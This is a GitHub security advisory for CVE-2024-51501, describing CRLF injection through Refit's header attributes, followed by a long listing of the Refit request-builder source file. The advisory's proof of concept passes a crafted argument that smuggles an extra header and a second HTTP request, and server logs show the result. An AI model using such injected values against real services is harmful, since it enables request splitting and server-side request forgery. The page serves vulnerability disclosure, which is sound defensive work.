=== Content from github.com_71feb4f3_20250114_200653.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Freactiveui%2Frefit%2Fsecurity%2Fadvisories%2FGHSA-3hxg-fxwm-8gf7)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Freactiveui%2Frefit%2Fsecurity%2Fadvisories%2FGHSA-3hxg-fxwm-8gf7)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=reactiveui%2Frefit)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[reactiveui](/reactiveui)
/
**[refit](/reactiveui/refit)**
Public

* [Notifications](/login?return_to=%2Freactiveui%2Frefit) You must be signed in to change notification settings
* [Fork
  747](/login?return_to=%2Freactiveui%2Frefit)
* [Star
   8.8k](/login?return_to=%2Freactiveui%2Frefit)

* [Code](/reactiveui/refit)
* [Issues
  182](/reactiveui/refit/issues)
* [Pull requests
  10](/reactiveui/refit/pulls)
* [Discussions](/reactiveui/refit/discussions)
* [Actions](/reactiveui/refit/actions)
* [Projects
  0](/reactiveui/refit/projects)
* [Wiki](/reactiveui/refit/wiki)
* [Security](/reactiveui/refit/security)
* [Insights](/reactiveui/refit/pulse)

Additional navigation options

* [Code](/reactiveui/refit)
* [Issues](/reactiveui/refit/issues)
* [Pull requests](/reactiveui/refit/pulls)
* [Discussions](/reactiveui/refit/discussions)
* [Actions](/reactiveui/refit/actions)
* [Projects](/reactiveui/refit/projects)
* [Wiki](/reactiveui/refit/wiki)
* [Security](/reactiveui/refit/security)
* [Insights](/reactiveui/refit/pulse)

# CRLF injection in Refit's [Header], [HeaderCollection] and [Authorize] attributes

Low

[ChrisPulman](/ChrisPulman)
published
GHSA-3hxg-fxwm-8gf7
Nov 4, 2024

## Package

Refit

## Affected versions

all

## Patched versions

8.0.0

## Description

### Summary

The various header-related Refit attributes (Header, HeaderCollection and Authorize) are vulnerable to CRLF injection.

### Details

The way HTTP headers are added to a request is via the `HttpHeaders.TryAddWithoutValidation` method:

[refit/Refit/RequestBuilderImplementation.cs](https://github.com/reactiveui/refit/blob/258a771f44417c6e48e103ac921fe4786f3c2a1e/Refit/RequestBuilderImplementation.cs#L1328)

Line 1328
in
[258a771](/reactiveui/refit/commit/258a771f44417c6e48e103ac921fe4786f3c2a1e)

|  | var added = request.Headers.TryAddWithoutValidation(name, value); |
| --- | --- |

This method does not check for CRLF characters in the header value.

This means that any headers added to a refit request are vulnerable to CRLF-injection. In general, CRLF-injection into a HTTP header (when using HTTP/1.1) means that one can inject additional HTTP headers or smuggle whole HTTP requests.

### PoC

The below example code creates a console app that takes one command line variable (a bearer token) and then makes a request to some status page with the provided token inserted in the "Authorization" header:

```
using Refit;

internal class Program
{
    private static void Main(string[] args)
    {
        // Usage: dotnet run <bearer token>
        string token = args[0];
        var service = RestService.For<IStatusApi>("http://insert.some.site.here");
        string response = service.GetStatus(token).Result;
        Console.WriteLine($"Response: {response}");
    }

    public interface IStatusApi
    {
        [Get("/status")]
        Task<string> GetStatus([Authorize("Bearer")] string token);
    }
}
```

This application is now vulnerable to CRLF-injection, and can thus be abused to for example perform request splitting and thus server side request forgery (SSRF):

```
anonymous@ubuntu-sofia-672448:~$ dotnet Refit-cli.dll $'test\r\nUser-Agent: injected header!\r\n\r\nGET /smuggled HTTP/1.1\r\nHost: insert.some.site.here'
Response: <html></html>
```

The application intends to send a single request of the form:

```
GET /status HTTP/1.1
Host: insert.some.site.here
Authorization: Bearer <bearer token>
```

But as the application is vulnerable to CRLF injection the above command will instead result in the following two requests being sent:

```
GET /status HTTP/1.1
Host: insert.some.site.here
Authorization: Bearer test
User-Agent: injected header!
```

and

```
GET /smuggled HTTP/1.1
Host: insert.some.site.here
```

This can be confirmed by checking the access logs on the server where these commands were run (with `insert.some.site.here` pointing to localhost):

```
anonymous@ubuntu-sofia-672448:~$ sudo tail /var/log/apache2/access.log
127.0.0.1 - - [29/Aug/2024:12:17:34 +0000] "GET /status HTTP/1.1" 200 240 "-" "injected header!"
127.0.0.1 - - [29/Aug/2024:12:17:34 +0000] "GET /smuggled HTTP/1.1" 404 436 "-" "-"
```
### Impact

If an application using the Refit library passes a user-controllable value through to a header, then that application becomes vulnerable to CRLF-injection. This is not necessarily a security issue for a command line application like the one above, but if such code were present in a web application then it becomes vulnerable to request splitting (as shown in the PoC) and thus Server Side Request Forgery.

Strictly speaking this is a potential vulnerability in applications using Refit, not in Refit itself, but I would argue that at the very least there needs to be a warning about this behaviour in the Refit documentation.

### Severity

Low

### CVE ID

CVE-2024-51501

### Weaknesses

[CWE-93](/advisories?query=cwe%3A93)

### Credits

* [![@sofiaml](https://avatars.githubusercontent.com/u/43377234?s=40&v=4)](/sofiaml)
  [sofiaml](/sofiaml)
  Reporter

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_9fa3cb08_20250114_200651.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Freactiveui%2Frefit%2Fblob%2F258a771f44417c6e48e103ac921fe4786f3c2a1e%2FRefit%2FRequestBuilderImplementation.cs)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Freactiveui%2Frefit%2Fblob%2F258a771f44417c6e48e103ac921fe4786f3c2a1e%2FRefit%2FRequestBuilderImplementation.cs)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=reactiveui%2Frefit)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[reactiveui](/reactiveui)
/
**[refit](/reactiveui/refit)**
Public

* [Notifications](/login?return_to=%2Freactiveui%2Frefit) You must be signed in to change notification settings
* [Fork
  747](/login?return_to=%2Freactiveui%2Frefit)
* [Star
   8.8k](/login?return_to=%2Freactiveui%2Frefit)

* [Code](/reactiveui/refit)
* [Issues
  182](/reactiveui/refit/issues)
* [Pull requests
  10](/reactiveui/refit/pulls)
* [Discussions](/reactiveui/refit/discussions)
* [Actions](/reactiveui/refit/actions)
* [Projects
  0](/reactiveui/refit/projects)
* [Wiki](/reactiveui/refit/wiki)
* [Security](/reactiveui/refit/security)
* [Insights](/reactiveui/refit/pulse)

Additional navigation options

* [Code](/reactiveui/refit)
* [Issues](/reactiveui/refit/issues)
* [Pull requests](/reactiveui/refit/pulls)
* [Discussions](/reactiveui/refit/discussions)
* [Actions](/reactiveui/refit/actions)
* [Projects](/reactiveui/refit/projects)
* [Wiki](/reactiveui/refit/wiki)
* [Security](/reactiveui/refit/security)
* [Insights](/reactiveui/refit/pulse)

## Files

 258a771
## Breadcrumbs

1. [refit](/reactiveui/refit/tree/258a771f44417c6e48e103ac921fe4786f3c2a1e)
2. /[Refit](/reactiveui/refit/tree/258a771f44417c6e48e103ac921fe4786f3c2a1e/Refit)
/
# RequestBuilderImplementation.cs

Copy path Blame  Blame
## Latest commit

## History

[History](/reactiveui/refit/commits/258a771f44417c6e48e103ac921fe4786f3c2a1e/Refit/RequestBuilderImplementation.cs)1340 lines (1197 loc) · 50.6 KB 258a771
## Breadcrumbs

1. [refit](/reactiveui/refit/tree/258a771f44417c6e48e103ac921fe4786f3c2a1e)
2. /[Refit](/reactiveui/refit/tree/258a771f44417c6e48e103ac921fe4786f3c2a1e/Refit)
/
# RequestBuilderImplementation.cs

Top
## File metadata and controls

* Code
* Blame

1340 lines (1197 loc) · 50.6 KB[Raw](https://github.com/reactiveui/refit/raw/258a771f44417c6e48e103ac921fe4786f3c2a1e/Refit/RequestBuilderImplementation.cs)1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661671681691701711721731741751761771781791801811821831841851861871881891901911921931941951961971981992002012022032042052062072082092102112122132142152162172182192202212222232242252262272282292302312322332342352362372382392402412422432442452462472482492502512522532542552562572582592602612622632642652662672682692702712722732742752762772782792802812822832842852862872882892902912922932942952962972982993003013023033043053063073083093103113123133143153163173183193203213223233243253263273283293303313323333343353363373383393403413423433443453463473483493503513523533543553563573583593603613623633643653663673683693703713723733743753763773783793803813823833843853863873883893903913923933943953963973983994004014024034044054064074084094104114124134144154164174184194204214224234244254264274284294304314324334344354364374384394404414424434444454464474484494504514524534544554564574584594604614624634644654664674684694704714724734744754764774784794804814824834844854864874884894904914924934944954964974984995005015025035045055065075085095105115125135145155165175185195205215225235245255265275285295305315325335345355365375385395405415425435445455465475485495505515525535545555565575585595605615625635645655665675685695705715725735745755765775785795805815825835845855865875885895905915925935945955965975985996006016026036046056066076086096106116126136146156166176186196206216226236246256266276286296306316326336346356366376386396406416426436446456466476486496506516526536546556566576586596606616626636646656666676686696706716726736746756766776786796806816826836846856866876886896906916926936946956966976986997007017027037047057067077087097107117127137147157167177187197207217227237247257267277287297307317327337347357367377387397407417427437447457467477487497507517527537547557567577587597607617627637647657667677687697707717727737747757767777787797807817827837847857867877887897907917927937947957967977987998008018028038048058068078088098108118128138148158168178188198208218228238248258268278288298308318328338348358368378388398408418428438448458468478488498508518528538548558568578588598608618628638648658668678688698708718728738748758768778788798808818828838848858868878888898908918928938948958968978988999009019029039049059069079089099109119129139149159169179189199209219229239249259269279289299309319329339349359369379389399409419429439449459469479489499509519529539549559569579589599609619629639649659669679689699709719729739749759769779789799809819829839849859869879889899909919929939949959969979989991000﻿using System.Collections;using System.Collections.Concurrent;using System.Net.Http;using System.Reflection;using System.Text;using System.Text.RegularExpressions;using System.Web;
namespace Refit{ class RequestBuilderImplementation<TApi>(RefitSettings? refitSettings = null) : RequestBuilderImplementation(typeof(TApi), refitSettings), IRequestBuilder<TApi> { }
 partial class RequestBuilderImplementation : IRequestBuilder { static readonly QueryAttribute DefaultQueryAttribute = new (); static readonly Uri BaseUri = new ("http://api"); readonly Dictionary<string, List<RestMethodInfoInternal>> interfaceHttpMethods; readonly ConcurrentDictionary< CloseGenericMethodKey, RestMethodInfoInternal > interfaceGenericHttpMethods; readonly IHttpContentSerializer serializer; readonly RefitSettings settings; public Type TargetType { get; }
 public RequestBuilderImplementation( Type refitInterfaceType, RefitSettings? refitSettings = null ) { var targetInterfaceInheritedInterfaces = refitInterfaceType.GetInterfaces();
 settings = refitSettings ?? new RefitSettings(); serializer = settings.ContentSerializer; interfaceGenericHttpMethods = new ConcurrentDictionary<CloseGenericMethodKey, RestMethodInfoInternal>();
 if (refitInterfaceType == null || !refitInterfaceType.GetTypeInfo().IsInterface) { throw new ArgumentException("targetInterface must be an Interface"); }
 TargetType = refitInterfaceType;
 var dict = new Dictionary<string, List<RestMethodInfoInternal>>();
 AddInterfaceHttpMethods(refitInterfaceType, dict); foreach (var inheritedInterface in targetInterfaceInheritedInterfaces) { AddInterfaceHttpMethods(inheritedInterface, dict); }
 interfaceHttpMethods = dict; }
 void AddInterfaceHttpMethods( Type interfaceType, Dictionary<string, List<RestMethodInfoInternal>> methods ) { // Consider public (the implicit visibility) and non-public abstract members of the interfaceType var methodInfos = interfaceType .GetMethods(BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.Public) .Where(i => i.IsAbstract);
 foreach (var methodInfo in methodInfos) { var attrs = methodInfo.GetCustomAttributes(true); var hasHttpMethod = attrs.OfType<HttpMethodAttribute>().Any(); if (hasHttpMethod) { if (!methods.TryGetValue(methodInfo.Name, out var value)) { value = []; methods.Add(methodInfo.Name, value); }
 var restinfo = new RestMethodInfoInternal(interfaceType, methodInfo, settings); value.Add(restinfo); } } }
 RestMethodInfoInternal FindMatchingRestMethodInfo( string key, Type[]? parameterTypes, Type[]? genericArgumentTypes ) { if (!interfaceHttpMethods.TryGetValue(key, out var httpMethods)) { throw new ArgumentException( "Method must be defined and have an HTTP Method attribute" ); }
 if (parameterTypes == null) { if (httpMethods.Count > 1) { throw new ArgumentException( $"MethodName exists more than once, '{nameof(parameterTypes)}' mut be defined" ); }
 return CloseGenericMethodIfNeeded(httpMethods[0], genericArgumentTypes); }
 var isGeneric = genericArgumentTypes?.Length > 0;
 var possibleMethodsCollection = httpMethods.Where( method => method.MethodInfo.GetParameters().Length == parameterTypes.Length );
 // If it's a generic method, add that filter if (isGeneric) possibleMethodsCollection = possibleMethodsCollection.Where( method => method.MethodInfo.IsGenericMethod && method.MethodInfo.GetGenericArguments().Length == genericArgumentTypes!.Length ); else // exclude generic methods possibleMethodsCollection = possibleMethodsCollection.Where( method => !method.MethodInfo.IsGenericMethod );
 var possibleMethods = possibleMethodsCollection.ToArray();
 if (possibleMethods.Length == 1) return CloseGenericMethodIfNeeded(possibleMethods[0], genericArgumentTypes);
 foreach (var method in possibleMethods) { var match = method .MethodInfo.GetParameters() .Select(p => p.ParameterType) .SequenceEqual(parameterTypes); if (match) { return CloseGenericMethodIfNeeded(method, genericArgumentTypes); } }
 throw new Exception("No suitable Method found..."); }
 RestMethodInfoInternal CloseGenericMethodIfNeeded( RestMethodInfoInternal restMethodInfo, Type[]? genericArgumentTypes ) { if (genericArgumentTypes != null) { return interfaceGenericHttpMethods.GetOrAdd( new CloseGenericMethodKey(restMethodInfo.MethodInfo, genericArgumentTypes), \_ => new RestMethodInfoInternal( restMethodInfo.Type, restMethodInfo.MethodInfo.MakeGenericMethod(genericArgumentTypes), restMethodInfo.RefitSettings ) ); } return restMethodInfo; }
 public Func<HttpClient, object[], object?> BuildRestResultFuncForMethod( string methodName, Type[]? parameterTypes = null, Type[]? genericArgumentTypes = null ) { if (!interfaceHttpMethods.ContainsKey(methodName)) { throw new ArgumentException( "Method must be defined and have an HTTP Method attribute" ); }
 var restMethod = FindMatchingRestMethodInfo( methodName, parameterTypes, genericArgumentTypes ); if (restMethod.ReturnType == typeof(Task)) { return BuildVoidTaskFuncForMethod(restMethod); }
 if (restMethod.ReturnType.GetGenericTypeDefinition() == typeof(Task<>)) { // NB: This jacked up reflection code is here because it's // difficult to upcast Task<object> to an arbitrary T, especially // if you need to AOT everything, so we need to reflectively // invoke buildTaskFuncForMethod. var taskFuncMi = typeof(RequestBuilderImplementation).GetMethod( nameof(BuildTaskFuncForMethod), BindingFlags.NonPublic | BindingFlags.Instance ); var taskFunc = (MulticastDelegate?) ( taskFuncMi!.MakeGenericMethod( restMethod.ReturnResultType, restMethod.DeserializedResultType ) ).Invoke(this, new[] { restMethod });
 return (client, args) => taskFunc!.DynamicInvoke(client, args); }
 // Same deal var rxFuncMi = typeof(RequestBuilderImplementation).GetMethod( nameof(BuildRxFuncForMethod), BindingFlags.NonPublic | BindingFlags.Instance ); var rxFunc = (MulticastDelegate?) ( rxFuncMi!.MakeGenericMethod( restMethod.ReturnResultType, restMethod.DeserializedResultType ) ).Invoke(this, new[] { restMethod });
 return (client, args) => rxFunc!.DynamicInvoke(client, args); }
 void AddMultipartItem( MultipartFormDataContent multiPartContent, string fileName, string parameterName, object itemValue ) { if (itemValue is HttpContent content) { multiPartContent.Add(content); return; } if (itemValue is MultipartItem multipartItem) { var httpContent = multipartItem.ToContent(); multiPartContent.Add( httpContent, multipartItem.Name ?? parameterName, string.IsNullOrEmpty(multipartItem.FileName) ? fileName : multipartItem.FileName ); return; }
 if (itemValue is Stream streamValue) { var streamContent = new StreamContent(streamValue); multiPartContent.Add(streamContent, parameterName, fileName); return; }
 if (itemValue is string stringValue) { multiPartContent.Add(new StringContent(stringValue), parameterName); return; }
 if (itemValue is FileInfo fileInfoValue) { var fileContent = new StreamContent(fileInfoValue.OpenRead()); multiPartContent.Add(fileContent, parameterName, fileInfoValue.Name); return; }
 if (itemValue is byte[] byteArrayValue) { var fileContent = new ByteArrayContent(byteArrayValue); multiPartContent.Add(fileContent, parameterName, fileName); return; }
 // Fallback to serializer Exception e; try { multiPartContent.Add( settings.ContentSerializer.ToHttpContent(itemValue), parameterName ); return; } catch (Exception ex) { // Eat this since we're about to throw as a fallback anyway e = ex; }
 throw new ArgumentException( $"Unexpected parameter type in a Multipart request. Parameter {fileName} is of type {itemValue.GetType().Name}, whereas allowed types are String, Stream, FileInfo, Byte array and anything that's JSON serializable", nameof(itemValue), e ); }
 Func<HttpClient, CancellationToken, object[], Task<T?>> BuildCancellableTaskFuncForMethod< T, TBody >(RestMethodInfoInternal restMethod) { return async (client, ct, paramList) => { if (client.BaseAddress == null) throw new InvalidOperationException( "BaseAddress must be set on the HttpClient instance" );
 var factory = BuildRequestFactoryForMethod( restMethod, client.BaseAddress.AbsolutePath, restMethod.CancellationToken != null ); var rq = factory(paramList); HttpResponseMessage? resp = null; HttpContent? content = null; var disposeResponse = true; try { // Load the data into buffer when body should be buffered. if (IsBodyBuffered(restMethod, rq)) { await rq.Content!.LoadIntoBufferAsync().ConfigureAwait(false); } resp = await client .SendAsync(rq, HttpCompletionOption.ResponseHeadersRead, ct) .ConfigureAwait(false); content = resp.Content ?? new StringContent(string.Empty); Exception? e = null; disposeResponse = restMethod.ShouldDisposeResponse;
 if (typeof(T) != typeof(HttpResponseMessage)) { e = await settings.ExceptionFactory(resp).ConfigureAwait(false); }
 if (restMethod.IsApiResponse) { var body = default(TBody);
 try { // Only attempt to deserialize content if no error present for backward-compatibility body = e == null ? await DeserializeContentAsync<TBody>(resp, content, ct) .ConfigureAwait(false) : default; } catch (Exception ex) { //if an error occured while attempting to deserialize return the wrapped ApiException e = await ApiException.Create( "An error occured deserializing the response.", resp.RequestMessage!, resp.RequestMessage!.Method, resp, settings, ex ); }
 return ApiResponse.Create<T, TBody>( resp, body, settings, e as ApiException ); } else if (e != null) { disposeResponse = false; // caller has to dispose throw e; } else { try { return await DeserializeContentAsync<T>(resp, content, ct) .ConfigureAwait(false); } catch (Exception ex) { throw await ApiException.Create( "An error occured deserializing the response.", resp.RequestMessage!, resp.RequestMessage!.Method, resp, settings, ex ); } } } finally { // Ensure we clean up the request // Especially important if it has open files/streams rq.Dispose(); if (disposeResponse) { resp?.Dispose(); content?.Dispose(); } } }; }
 async Task<T?> DeserializeContentAsync<T>( HttpResponseMessage resp, HttpContent content, CancellationToken cancellationToken ) { T? result; if (typeof(T) == typeof(HttpResponseMessage)) { // NB: This double-casting manual-boxing hate crime is the only way to make // this work without a 'class' generic constraint. It could blow up at runtime // and would be A Bad Idea if we hadn't already vetted the return type. result = (T)(object)resp; } else if (typeof(T) == typeof(HttpContent)) { result = (T)(object)content; } else if (typeof(T) == typeof(Stream)) { var stream = (object) await content.ReadAsStreamAsync(cancellationToken).ConfigureAwait(false); result = (T)stream; } else if (typeof(T) == typeof(string)) { using var stream = await content .ReadAsStreamAsync(cancellationToken) .ConfigureAwait(false); using var reader = new StreamReader(stream); var str = (object)await reader.ReadToEndAsync().ConfigureAwait(false); result = (T)str; } else { result = await serializer .FromHttpContentAsync<T>(content, cancellationToken) .ConfigureAwait(false); } return result; }
 List<KeyValuePair<string, object?>> BuildQueryMap( object? @object, string? delimiter = null, RestMethodParameterInfo? parameterInfo = null ) { if (@object is IDictionary idictionary) { return BuildQueryMap(idictionary, delimiter); }
 var kvps = new List<KeyValuePair<string, object?>>();
 if (@object is null) return kvps;
 var props = @object .GetType() .GetProperties(BindingFlags.Instance | BindingFlags.Public) .Where(p => p.CanRead && p.GetMethod?.IsPublic == true);
 foreach (var propertyInfo in props) { var obj = propertyInfo.GetValue(@object); if (obj == null) continue;
 //if we have a parameter info lets check it to make sure it isn't bound to the path if (parameterInfo is { IsObjectPropertyParameter: true }) { if (parameterInfo.ParameterProperties.Any(x => x.PropertyInfo == propertyInfo)) { continue; } }
 var key = propertyInfo.Name;
 var aliasAttribute = propertyInfo.GetCustomAttribute<AliasAsAttribute>(); key = aliasAttribute?.Name ?? settings.UrlParameterKeyFormatter.Format(key);
 // Look to see if the property has a Query attribute, and if so, format it accordingly var queryAttribute = propertyInfo.GetCustomAttribute<QueryAttribute>(); if (queryAttribute is { Format: not null }) { obj = settings.FormUrlEncodedParameterFormatter.Format( obj, queryAttribute.Format ); }
 // If obj is IEnumerable - format it accounting for Query attribute and CollectionFormat if (obj is not string && obj is IEnumerable ienu && obj is not IDictionary) { foreach ( var value in ParseEnumerableQueryParameterValue( ienu, propertyInfo, propertyInfo.PropertyType, queryAttribute ) ) { kvps.Add(new KeyValuePair<string, object?>(key, value)); }
 continue; }
 if (DoNotConvertToQueryMap(obj)) { kvps.Add(new KeyValuePair<string, object?>(key, obj)); continue; }
 switch (obj) { case IDictionary idict: foreach (var keyValuePair in BuildQueryMap(idict, delimiter)) { kvps.Add( new KeyValuePair<string, object?>( $"{key}{delimiter}{keyValuePair.Key}", keyValuePair.Value ) ); }
 break;
 default: foreach (var keyValuePair in BuildQueryMap(obj, delimiter)) { kvps.Add( new KeyValuePair<string, object?>( $"{key}{delimiter}{keyValuePair.Key}", keyValuePair.Value ) ); }
 break; } }
 return kvps; }
 List<KeyValuePair<string, object?>> BuildQueryMap( IDictionary dictionary, string? delimiter = null ) { var kvps = new List<KeyValuePair<string, object?>>();
 foreach (var key in dictionary.Keys) { var obj = dictionary[key]; if (obj == null) continue;
 var keyType = key.GetType(); var formattedKey = settings.UrlParameterFormatter.Format(key, keyType, keyType);
 if (string.IsNullOrWhiteSpace(formattedKey)) // blank keys can't be put in the query string { continue; }
 if (DoNotConvertToQueryMap(obj)) { kvps.Add(new KeyValuePair<string, object?>(formattedKey!, obj)); } else { foreach (var keyValuePair in BuildQueryMap(obj, delimiter)) { kvps.Add( new KeyValuePair<string, object?>( $"{formattedKey}{delimiter}{keyValuePair.Key}", keyValuePair.Value ) ); } } }
 return kvps; }
 Func<object[], HttpRequestMessage> BuildRequestFactoryForMethod( RestMethodInfoInternal restMethod, string basePath, bool paramsContainsCancellationToken ) { return paramList => { // make sure we strip out any cancellation tokens if (paramsContainsCancellationToken) { paramList = paramList .Where(o => o == null || o.GetType() != typeof(CancellationToken)) .ToArray(); }
 var ret = new HttpRequestMessage { Method = restMethod.HttpMethod };
 // set up multipart content MultipartFormDataContent? multiPartContent = null; if (restMethod.IsMultipart) { multiPartContent = new MultipartFormDataContent(restMethod.MultipartBoundary); ret.Content = multiPartContent; }
 var urlTarget = (basePath == "/" ? string.Empty : basePath) + restMethod.RelativePath; var queryParamsToAdd = new List<KeyValuePair<string, string?>>(); var headersToAdd = restMethod.Headers.Count > 0 ? new Dictionary<string, string?>(restMethod.Headers) : null;
 RestMethodParameterInfo? parameterInfo = null;
 for (var i = 0; i < paramList.Length; i++) { var isParameterMappedToRequest = false; var param = paramList[i]; // if part of REST resource URL, substitute it in if (restMethod.ParameterMap.TryGetValue(i, out var parameterMapValue)) { parameterInfo = parameterMapValue; if (parameterInfo.IsObjectPropertyParameter) { urlTarget = AddObjectParametersToUrl(parameterInfo, param, urlTarget); //don't continue here as we want it to fall through so any parameters on this object not bound here get passed as query parameters } else { urlTarget = AddValueParameterToUrl(restMethod, parameterMapValue, param, i, urlTarget); isParameterMappedToRequest = true; } }
 // if marked as body, add to content if ( restMethod.BodyParameterInfo != null && restMethod.BodyParameterInfo.Item3 == i ) { AddBodyToRequest(restMethod, param, ret); isParameterMappedToRequest = true; }
 // if header, add to request headers if (restMethod.HeaderParameterMap.TryGetValue(i, out var headerParameterValue)) { headersToAdd ??= new Dictionary<string, string?>(); headersToAdd[headerParameterValue] = param?.ToString(); isParameterMappedToRequest = true; }
